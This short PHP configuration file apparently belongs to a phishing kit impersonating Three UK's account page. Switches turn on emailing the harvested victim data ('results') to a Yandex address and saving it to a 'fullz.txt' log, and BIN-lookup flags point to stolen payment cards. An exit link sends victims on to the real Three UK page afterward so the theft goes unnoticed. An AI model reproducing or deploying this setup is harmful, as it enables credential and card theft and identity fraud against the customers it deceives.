<?php
//Systems:

// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt


$saveFile = 1;
$sendEmail = 1;
$binSave = 0;
$binlist = 0;


$to = 'awesome.triz@yandex.com';
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjrwNuM-LXkAhUxSEEAHYj9CwIQFjAAegQIARAB&url=https%3A%2F%2Fwww.three.co.uk%2Fmy3account&usg=AOvVaw3qqSeaOeh9xKvqldPlM7Cr";

?>